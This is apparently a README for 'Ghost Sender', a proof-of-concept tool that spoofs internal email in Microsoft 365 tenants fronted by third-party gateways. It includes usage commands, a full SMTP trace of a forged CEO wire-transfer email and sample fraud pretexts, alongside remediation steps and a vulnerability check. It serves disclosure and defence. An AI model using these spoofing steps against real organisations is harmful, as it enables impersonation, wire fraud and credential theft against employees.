# Ghost Sender

Exchange Online email spoofing via external MX bypass.

When a Microsoft 365 tenant uses a third-party email gateway (Forcepoint, Proofpoint, Mimecast, etc.) as its MX record without configuring a partner connector or transport rule, Exchange Online accepts mail sent directly to its endpoint — bypassing the gateway entirely. SPF, DKIM, DMARC, DLP, content filtering, and attachment scanning are never invoked. Spoofed emails arrive in the inbox with no external warning, appearing as genuine internal correspondence.

## References

- [InfoGuard Labs — Ghost Sender Disclosure](https://labs.infoguard.ch/posts/ghost-sender/)
- [Microsoft — Direct Send vs Sending Directly to Exchange Online](https://techcommunity.microsoft.com/blog/exchange/direct-send-vs-sending-directly-to-an-exchange-online-tenant/4439865)

---

## How It Works

```
Normal Mail Flow                          Attack Path (Ghost Sender)
================                         ==========================

Sender ──> MX Gateway ──> M365 ──> Inbox    Attacker ──> M365 ──> Inbox
          (Forcepoint)    (trusted)          (clean IP)   (direct TCP:25)

          DLP applied      DMARC ok                       DLP bypassed
          SPF checked      delivered                      DMARC ignored
                                                          delivered anyway
```

Exchange Online, when fronted by an external MX, treats all inbound mail as pre-filtered by the gateway. A direct connection to `domain-com.mail.protection.outlook.com:25` inherits that same trust — no authentication is enforced.

---

## Impact

### Internal Spoofing

An attacker impersonates employees, executives, IT, HR, or finance to internal recipients. The email displays the sender's profile photo, appears in the same email thread, and shows no external banner. This enables:

- **CEO fraud and wire transfer requests** — "Process this invoice by EOD. Regards, CFO"
- **Credential harvesting** — "Your password has expired. Reset here: [link]"
- **Malware delivery** — attachments and links that bypass gateway sandboxing
- **Data exfiltration** — "Please send me the Q2 financials for review"

### Gateway Evasion

All MX gateway protections are bypassed because the email never passes through them:

| Layer | Function | Status |
|-------|----------|--------|
| MX Gateway (Forcepoint/Proofpoint/Mimecast) | DLP, content filtering, attachment sandboxing, URL rewriting, anti-spam | Bypassed |
| SPF | Sender IP authorization | Not checked |
| DKIM | Cryptographic signing | Not checked |
| DMARC | Policy enforcement (`p=reject`) | Not enforced |
| External tagging | Warning banner, "Caution: External Sender" | Not applied |

### Exploit Requirements

- A TCP connection to the target's M365 endpoint on port 25
- A clean IP address (not blocklisted)
- No credentials, no infrastructure access, no domain ownership

---

## Proof of Concept

### One-Liner

```bash
./send.sh domain.com sender@domain.com recipient@domain.com "Subject" "Body"
```

### Mail Server

```bash
python3 mail-server.py
# Web interface at http://localhost:8080
```

Supports multiple recipients, CC, and a JSON API:

```bash
curl -X POST http://localhost:8080/send \
  -d "from=ceo@domain.com" \
  -d "to=employee@domain.com,hr@domain.com" \
  -d "cc=legal@domain.com" \
  -d "subject=Q2 Budget — Final Review" \
  -d "body=Team, please review the attached Q2 figures before the board meeting. Regards, CEO"
```

### SMTP Trace

```
$ openssl s_client -connect domain-com.mail.protection.outlook.com:25 -starttls smtp

<-- 220 Microsoft ESMTP MAIL Service ready
--> EHLO x
<-- 250-STARTTLS
--> STARTTLS
--> EHLO x
--> MAIL FROM:<ceo@domain.com>
<-- 250 2.1.0 Sender OK
--> RCPT TO:<employee@domain.com>
<-- 250 2.1.5 Recipient OK
--> DATA
<-- 354 Start mail input
--> From: CEO <ceo@domain.com>
--> To: employee@domain.com
--> Subject: Urgent: Wire Transfer
-->
--> Please process the attached wire transfer for the Singapore acquisition.
--> .
<-- 250 2.6.0 Queued mail for delivery [InternalId=...]

Email delivered to inbox. No banner. Profile photo displayed.
```

---

## Remediation

Apply **one** of the following in the Exchange Admin Center:

### Option 1 — Partner Connector (Recommended)

```
Mail Flow > Connectors > Add
  From: Partner organization
  Identify by: Sender's IP address
  IP ranges: [Gateway IPs only]
  Security: Reject mail not sent from these IPs
```

### Option 2 — Transport Rule

```
Mail Flow > Rules > New
  Priority: 0
  If: Sender is outside the organization
  AND: Sender IP not in [Gateway IPs]
  Action: Reject (5.7.1)
```

### Option 3 — Remove External MX

```
Point MX to: domain-com.mail.protection.outlook.com
Enable Enhanced Filtering for Connectors if gateway must be retained.
```

---

## Domain Assessment

```bash
# Check MX configuration
dig +short MX domain.com

# If MX points to a third-party gateway (not *.mail.protection.outlook.com)
# and no partner connector is configured, the domain is likely vulnerable.

# Verify M365 EOP reachability
echo "QUIT" | openssl s_client -connect \
  $(echo domain.com | tr '.' '-').mail.protection.outlook.com:25 \
  -starttls smtp -crlf -quiet 2>/dev/null | head -1
```

---

## Requirements

- Python
- Outbound TCP port 25
- Clean IP (Spamhaus delisting: https://check.spamhaus.org)

## Files

| File | Purpose |
|------|---------|
| `send.sh` | Single-email PoC |
| `mail-server.py` | Web UI, multi-recipient, CC, JSON API |
| `LICENSE` | MIT |

## License

MIT © Sanaullah Korai

---

Test only infrastructure you own or have written authorization to assess.
